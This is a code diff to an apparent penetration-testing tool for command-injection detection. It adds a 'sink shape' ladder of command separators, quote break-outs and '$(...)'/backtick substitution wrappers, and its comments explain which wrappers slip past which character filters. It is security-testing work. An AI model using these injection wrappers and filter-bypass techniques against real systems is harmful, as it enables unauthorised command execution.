@@ -26,7 +26,7 @@ logger = logging.getLogger(__name__)
 
 # Bump on every change: PATCH for fixes, MINOR for new capabilities, MAJOR for
 # breaking changes to the CLI, output formats, or template schema.
-__version__ = "2.25.0"
+__version__ = "2.26.0"
 
 SAFETY_ORDER = {"safe": 0, "intrusive": 1, "stateful": 2}
 
@@ -36,6 +36,88 @@ SAFETY_ORDER = {"safe": 0, "intrusive": 1, "stateful": 2}
 # engine: keeping it in one place is what stops the two from drifting apart,
 # as they did when only the generator carried the guard.
 SELF_SEPARATING_CONTEXTS = {"shell_single_quoted", "shell_double_quoted"}
+
+# Contexts that reach the shell through *command substitution* rather than by
+# breaking out of the running command. They need no separator either, but for
+# the opposite reason: there is nothing to break out of. The payload is a
+# substitution the shell evaluates where it sits.
+#
+# This is the sink shape no other context reaches. Measured against `sh -c 'echo
+# PING "<input>"'`, with the app filtering one metacharacter:
+#
+#   filter        shell_double_quoted   shell_subshell   shell_backtick
+#   strips "      inert                 EXECUTED         EXECUTED
+#   strips $      EXECUTED              inert            EXECUTED
+#
+# So the quoted break-out and the substitution cover different filters, and the
+# backtick form survives both -- which is why both substitution shapes ship
+# rather than the `$( )` one alone.
+SUBSTITUTION_CONTEXTS = {"shell_subshell", "shell_backtick"}
+
+# Contexts that supply their own way into the shell, so a probe must not prepend
+# a command separator to them.
+NO_SEPARATOR_CONTEXTS = SELF_SEPARATING_CONTEXTS | SUBSTITUTION_CONTEXTS
+
+# The sink-shape ladder: one name per shape the injected value can land in, in
+# escalation order (cheapest and most common first). `--sink-shape` selects
+# rungs; the machinery underneath is the existing separator sweep and break-out
+# contexts, so naming a rung narrows an already-supported run rather than
+# switching on a parallel code path.
+SINK_SHAPE_RUNGS = ("sep", "raw", "chain", "newline", "dq", "sq", "subshell")
+# Rungs that vary the command *separator* the probe breaks out with.
+SINK_SHAPE_SEPARATORS = {
+    "sep": ("; ",),
+    "chain": ("| ", "|| ", "&& "),
+    "newline": ("\n",),
+}
+# Rungs that vary the *context* the probe is wrapped in.
+SINK_SHAPE_CONTEXTS = {
+    "sq": ("shell_single_quoted",),
+    "dq": ("shell_double_quoted",),
+    "subshell": ("shell_subshell", "shell_backtick"),
+}
+
+
+# Methods whose probes are shell commands, and so ride the sink-shape ladder.
+# `eval` is deliberately absent: its probes are template/expression syntax, not
+# shell, so no separator or quote break-out applies to them.
+SHELL_PROBE_METHODS = {"reflected", "file", "time", "oob"}
+
+
+def sink_shape_plan(shapes: Optional[Tuple[str, ...]]) -> List[str]:
+    """One line per rung the run will try, for the pre-flight execution plan.
+
+    The ladder multiplies request count, so what it is about to send is stated
+    before it is sent rather than inferred from the traffic afterwards."""
+    selected = shapes or SINK_SHAPE_RUNGS
+    described = {
+        "raw": "input is the whole command (no separator)",
+        "sep": "'; ' -- mid-command concatenation",
+        "chain": "'| ', '|| ', '&& ' -- pipes and conditional chains",
+        "newline": "newline -- line-oriented sinks (CGI, config writers)",
+        "sq": "\"'; ... #\" -- value inside single quotes",
+        "dq": "'\"; ... #' -- value inside double quotes",
+        "subshell": "'$(...)' and backticks -- substitution inside a quoted string",
+    }
+    return [f"[detect]   {rung:<9} {described[rung]}"
+            for rung in SINK_SHAPE_RUNGS if rung in selected]
+
+
+def parse_sink_shapes(value: Optional[str]) -> Optional[Tuple[str, ...]]:
+    """``--sink-shape`` -> the rungs to try, or ``None`` for the whole ladder.
+
+    Raises ``ValueError`` naming the offending rung, so a typo is refused rather
+    than silently narrowing the run to nothing."""
+    if not value or value == "auto":
+        return None
+    rungs = tuple(part.strip() for part in value.split(",") if part.strip())
+    unknown = [rung for rung in rungs if rung not in SINK_SHAPE_RUNGS]
+    if unknown:
+        raise ValueError(f"unknown sink shape(s): {', '.join(unknown)}; "
+                         f"choose from auto, {', '.join(SINK_SHAPE_RUNGS)}")
+    if not rungs:
+        return None
+    return rungs
 
 
 @dataclass(frozen=True)
@@ -101,6 +183,12 @@ class RCEKit:
             "powershell": {"prefix": "", "suffix": "", "escape": "none"},
             "shell_single_quoted": {"prefix": "'; ", "suffix": " #", "escape": "none"},
             "shell_double_quoted": {"prefix": "\"; ", "suffix": " #", "escape": "none"},
+            # Command substitution: runs where it sits, so it reaches a
+            # double-quoted sink without closing the quote (see
+            # SUBSTITUTION_CONTEXTS). Both forms ship because they survive
+            # different filters.
+            "shell_subshell": {"prefix": "$(", "suffix": ")", "escape": "none"},
+            "shell_backtick": {"prefix": "`", "suffix": "`", "escape": "none"},
             "graphql_string": {"prefix": "", "suffix": "", "escape": "graphql"},
             # Transport / serialization contexts (carry any environment's payload)
             "json": {"prefix": "", "suffix": "", "escape": "json"},
@@ -1827,16 +1915,29 @@ class RCEKit:
         one sink shape they exist for was the one shape that could not be
         detected at all. They are cheap (self-separating, so one body each).
 
+        The substitution contexts ride here too, for the same reason and with
+        the same shape of argument: ``$(...)`` and backticks reach a sink whose
+        value sits inside double quotes *without closing the quote*, which is
+        the one case a quoted break-out loses to a filter on the quote itself.
+
+        Which contexts are added follows ``--sink-shape``, so naming a rung
+        narrows this rather than bypassing it.
+
         Skipped when the operator named ``--contexts`` explicitly -- a narrowed
         run is a deliberate choice about what to send, and widening it behind
         the operator's back is not this function's call."""
         if config.get("contexts_explicit"):
             return []
+        shapes = config.get("sink_shapes")
+        wanted: List[str] = []
+        for rung in SINK_SHAPE_RUNGS:
+            if rung in SINK_SHAPE_CONTEXTS and (not shapes or rung in shapes):
+                wanted.extend(SINK_SHAPE_CONTEXTS[rung])
         extra: List[PayloadRecord] = []
         for record in list(carriers):
             if record.environment not in SHELL_CAPABLE_ENVIRONMENTS:
                 continue
-            for context in sorted(SELF_SEPARATING_CONTEXTS):
+            for context in wanted:
                 key = (record.environment, context)
                 if key in carrier_seen:
                     continue
@@ -2585,25 +2686,79 @@ class DetectionMethod:
     }
 
     def _separators(self, windows: bool) -> Tuple[str, ...]:
-        """The separators to sweep, from ``--separators`` when given."""
+        """The separators to sweep.
+
+        ``--separators`` is the explicit, lowest-level control and still wins
+        outright. Otherwise ``--sink-shape`` narrows the sweep to the separators
+        of the rungs it named — and if it named none of them (say
+        ``--sink-shape sq``), the sweep is empty on purpose: the only shapes
+        left are ones that supply their own way into the shell, so a
+        separator-led probe would be a request that cannot confirm.
+
+        Windows keeps its own table. Its separators are genuinely different
+        (``&`` and ``&&`` work, ``;`` does not), so a rung name maps to the
+        environment's own vocabulary rather than to a global one."""
         configured = self.config.get("separators")
         if configured:
             return tuple(configured)
-        return self.DEFAULT_SEPARATORS["windows" if windows else "unix"]
+        table = self.DEFAULT_SEPARATORS["windows" if windows else "unix"]
+        shapes = self.config.get("sink_shapes")
+        if not shapes:
+            return table
+        if windows:
+            # Map the rungs onto cmd.exe's vocabulary by position of meaning:
+            # 'sep' is its plain chainer, 'chain' its pipes/conditionals. cmd
+            # has no line-oriented separator, so 'newline' contributes nothing.
+            windows_rungs = {"sep": (" & ",), "chain": (" | ", " || ", " && "), "newline": ()}
+            selected: List[str] = []
+            for rung in SINK_SHAPE_RUNGS:
+                if rung in shapes:
+                    selected.extend(windows_rungs.get(rung, ()))
+            return tuple(dict.fromkeys(selected))
+        selected = []
+        for rung in SINK_SHAPE_RUNGS:
+            if rung in shapes:
+                selected.extend(SINK_SHAPE_SEPARATORS.get(rung, ()))
+        return tuple(dict.fromkeys(selected))
 
     def _needs_separator(self, record: "PayloadRecord") -> bool:
         """Whether a probe for this record must supply its own separator.
 
-        Two cases must not get one. With ``--sink-raw`` the injected input is
+        Three cases must not get one. With ``--sink-raw`` the injected input is
         executed as the *whole* command (a ``qx/$input/``-style sink with no
         surrounding command to break out of), so a leading ``;`` is a syntax
-        error. And a shell-quoted context's prefix already ends in one, so
+        error. A shell-quoted context's prefix already ends in one, so
         adding another produced ``'; ; cmd`` -- the generator has guarded that
         since it was found there; the detection engine had not, which made the
         one context genuinely fitting a quoted sink the one that could not
-        confirm on it."""
+        confirm on it.
+
+        A substitution context is the third, and it is not the second in
+        disguise: ``$(cmd)`` and ``` `cmd` ``` never break out of the running
+        command, they *are* an expression the shell evaluates where it sits. A
+        leading ``;`` would put a syntax error inside the substitution."""
         return not (self.config.get("sink_raw")
-                    or record.context in SELF_SEPARATING_CONTEXTS)
+                    or record.context in NO_SEPARATOR_CONTEXTS)
+
+    def _raw_rung_selected(self) -> bool:
+        """Whether the bare, separator-free body should also be sent.
+
+        Part of the ladder rather than a mode: ``--sink-raw`` makes the raw
+        shape the *only* one tried (a deliberate narrowing, unchanged), while
+        the ladder sends it *alongside* the separator sweep so a whole-command
+        sink is found without the operator having guessed its shape first."""
+        if self.config.get("sink_raw"):
+            return False  # already the only body; see _needs_separator
+        shapes = self.config.get("sink_shapes")
+        if shapes is not None:
+            return "raw" in shapes
+        if self.config.get("separators"):
+            # Naming the separators is a statement that the sink is
+            # separator-led: the operator has said which break-outs it accepts,
+            # so a bare command is not one of the shapes they asked for.
+            # --sink-shape raw,... overrides this, being the more specific say.
+            return False
+        return True
 
     def _wrap_variants(self, record: "PayloadRecord", core: str, windows: bool = False,
                        evade: bool = True, terminate: bool = False) -> List[str]:
@@ -2635,6 +2790,14 @@ class DetectionMethod:
             core = f"{core} #"
         if self._needs_separator(record):
             bodies = [f"{separator}{core}" for separator in self._separators(windows)]
+            if self._raw_rung_selected():
+                # The `raw` rung: the sink runs the injected value as the whole
+                # command, so the bare core is the probe. It used to need
+                # --sink-raw, which meant a qx/$input/-style sink reported clean
+                # unless the operator already suspected its shape -- a false
+                # negative that took prior knowledge to avoid. One extra probe
+                # per carrier buys it.
+                bodies.append(core)
         else:
             bodies = [core]
         payloads: List[str] = []
@@ -2672,6 +2835,10 @@ class DetectionMethod:
             if " " in trimmed:
                 continue
             pairs.append((separator, f"{trimmed}{core}"))
+        if self._raw_rung_selected():
+            # A space-filtering sink can also be a whole-command sink; the two
+            # filters are unrelated, so the raw rung applies here as well.
+            pairs.append((None, core))
         return pairs
 
     def _context_swallows(self, record: "PayloadRecord", body: str) -> bool:
@@ -2689,6 +2856,13 @@ class DetectionMethod:
         ``shell_double_quoted`` (``"; `` … `` #``) *closes* the sink's quote and
         comments out its tail, so quotes in the body are fine — verified.
 
+        The backtick substitution context is the same failure through a
+        different character: ``` `...` ``` does not nest, so a probe whose body
+        carries its own backtick (the ``expr`` shape does) closes the outer
+        substitution early and the remainder is no longer a command. ``$( )``
+        *does* nest, so the subshell context carries every shape and is
+        deliberately not caught here.
+
         Only for contexts that pass the body through verbatim. Where an escape
         rule applies, the quote is the serialization layer's, and what the sink
         finally sees depends on the parser in between."""
@@ -2696,7 +2870,7 @@ class DetectionMethod:
         prefix, suffix = ctx.get("prefix", ""), ctx.get("suffix", "")
         if ctx.get("escape", "none") != "none":
             return False
-        if prefix and prefix == suffix and prefix in ('"', "'"):
+        if prefix and prefix == suffix and prefix in ('"', "'", "`"):
             return prefix in body
         return False
 
@@ -3900,7 +4074,16 @@ def main():
     parser.add_argument("--sink-raw", action="store_true", default=None,
                         help="(--methods) Sink runs the injected input as the whole command "
                              "(no surrounding command to break out of, e.g. a qx/$input/ sink): "
-                             "send shell probes as bare commands without a leading separator")
+                             "send shell probes as bare commands ONLY. Narrowing alias for "
+                             "--sink-shape raw; the ladder already tries the raw shape alongside "
+                             "the others, so this is for cutting requests once you know the sink.")
+    parser.add_argument("--sink-shape", default=None, metavar="SHAPES",
+                        help="(--methods) Which sink shapes the shell probes try, comma-separated: "
+                             f"auto (default, the whole ladder) or any of {', '.join(SINK_SHAPE_RUNGS)}. "
+                             "sep/chain/newline vary the command separator; raw sends the bare "
+                             "command; sq/dq break out of a surrounding quote; subshell reaches a "
+                             "quoted value through $(...) and backticks without closing the quote. "
+                             "Narrow it to cut request count once the sink's shape is known.")
     parser.add_argument("--sink-blind", action="store_true", default=None,
                         help="Sink returns no output: keep only out-of-band confirmable payloads (timing/OOB)")
     parser.add_argument("--sink-decodes", nargs="+", default=None,
@@ -3963,6 +4146,16 @@ def main():
     # Sink-shape awareness: narrow generation to what this sink could execute.
     needs_separator = bool(from_profile(args.sink_needs_separator, "sink_needs_separator"))
     sink_raw = bool(from_profile(args.sink_raw, "sink_raw"))
+    try:
+        sink_shapes = parse_sink_shapes(from_profile(args.sink_shape, "sink_shape"))
+    except ValueError as exc:
+        print(f"[!] {exc}")
+        return 1
+    if needs_separator and sink_shapes is None:
+        # A profile that states the sink concatenates input mid-command has
+        # already ruled the raw shape out: the value is never the whole command
+        # there, so those probes are requests that cannot confirm.
+        sink_shapes = tuple(rung for rung in SINK_SHAPE_RUNGS if rung != "raw")
     blind = bool(from_profile(args.sink_blind, "sink_blind"))
     sink_decodes = from_profile(args.sink_decodes, "sink_decodes") or []
     # Separators the shell probes break out with. A profile may carry them as a
@@ -4199,6 +4392,7 @@ def main():
             detection_config = {"webroot": args.webroot, "web_base_url": args.web_base_url,
                                 "time_base": args.time_base, "evade": args.evade,
                                 "sink_raw": sink_raw, "separators": separators,
+                                "sink_shapes": sink_shapes,
                                 "probe_depth": args.probe_depth,
                                 "contexts_explicit": bool(selected_contexts),
                                 "oob_host": args.oob_host,
@@ -4244,6 +4438,15 @@ def main():
                     return 1
                 print(f"[detect] file-based method WRITES to {args.webroot} on the target and fetches via "
                       f"{args.web_base_url}; each confirmed finding lists a cleanup command.")
+            if not sink_raw and set(method_names) & SHELL_PROBE_METHODS:
+                # The ladder multiplies request count, so say which shapes are
+                # about to be tried before trying them. An operator on a
+                # monitored engagement needs to see the cost first, not infer it
+                # from the traffic afterwards.
+                label = "auto (full ladder)" if sink_shapes is None else ", ".join(sink_shapes)
+                print(f"[detect] sink shapes: {label}")
+                for line in sink_shape_plan(sink_shapes):
+                    print(line)
             results = generator.run_detection(
                 to_send, url=verify_url, methods=method_names, method=method,
                 data=verify_data, headers=verify_headers, delay=args.verify_delay,
